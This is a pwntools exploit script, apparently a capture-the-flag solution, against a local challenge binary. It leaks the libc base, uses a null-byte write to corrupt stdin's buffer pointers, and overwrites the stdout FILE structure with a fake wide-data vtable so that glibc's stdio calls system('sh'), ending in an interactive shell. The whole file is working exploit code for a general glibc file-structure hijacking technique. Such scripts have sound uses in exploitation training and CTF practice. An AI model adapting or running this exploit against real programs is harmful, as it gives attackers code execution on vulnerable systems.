#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127.0.0.1 --port 4000

# dont forget to: patchelf --set-interpreter /tmp/ld-2.27.so ./test
# dont forget to set conext.arch. E.g amd64

from pwn import *
import re

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './chall_patched'
context.terminal = ['tmux', 'new-window']
argv = []
env = {}
#libc = ELF('./libc-2.29.so')
libc = ELF("./libc.so.6")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 4000)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

def get_leak():
    io.sendlineafter(">", str(1))
    leak = io.recvline().decode()
    print(leak)
    match = re.search(r"0[xX][0-9a-fA-F]+", leak)
    return int(match.group(0), 0x10)

def write_null(addr):
    io.sendlineafter(">", str(2))
    io.sendlineafter("Mem:", hex(addr))

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
# pwndbg tele command
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start(argv, env=env)

libc.address = get_leak()


log.info(f"Libc base: {hex(libc.address)}")

# corrupt buf_base ptr to point to stdin + 0x20
write_null(libc.sym['_IO_2_1_stdin_']+0x38)

# corrupt starting at stdin+0x20
# corrupt part of stdin struct to then overwrite stdout
fake_stdin = p64(0)*3
# buf_base
fake_stdin += p64(libc.sym['_IO_2_1_stdout_'])
# buf_end
fake_stdin += p64(libc.sym['_IO_2_1_stdout_']+0x400)
fake_stdin += p64(0)*4

io.sendline(fake_stdin)

# corrupt stdout struct
# printf will call _IO_file_xsputn
# which will call _IO_wfile_overflow (since we overwrote vtable with wfile jumps), to flush buffer
# if checks pass, _IO_wfile_overflow will call _IO_wdoallocbuf wich will call 
# system with pointer to stdout struct in rdi
stdout_lock = libc.address + 0x205710
stdout = libc.sym['_IO_2_1_stdout_']
fake_vtable = libc.sym['_IO_wfile_jumps']
fake_stdout = FileStructure(0)
len_stdout = len(bytes(fake_stdout))
fake_stdout.flags = p8(0x20)*4+ b"sh\x00\x00"
fake_stdout._wide_data = stdout+len_stdout
fake_stdout.vtable = libc.sym['_IO_wfile_jumps']

payload = bytes(fake_stdout)

# fake the _IO_wide_data struct, especially fake the vtable ptr and the vtable itself
# _IO_wide_data
wide_data = p64(0x0)*11 # io_jump_ptrs
wide_data += p64(0x0)*2# state
wide_data += p64(0x0)*(0x70//8) # codevect
wide_data += p64(0x0) # shortbuf
wide_data += p64(stdout + len_stdout + 0xe8) # wide_vtable ptr
# fake wide_vtable (_IO_jump_t)
wide_data += p64(0x0)*13
# __doallocate
wide_data += p64(libc.sym['system'])

payload += wide_data
io.sendline(payload)


io.interactive()

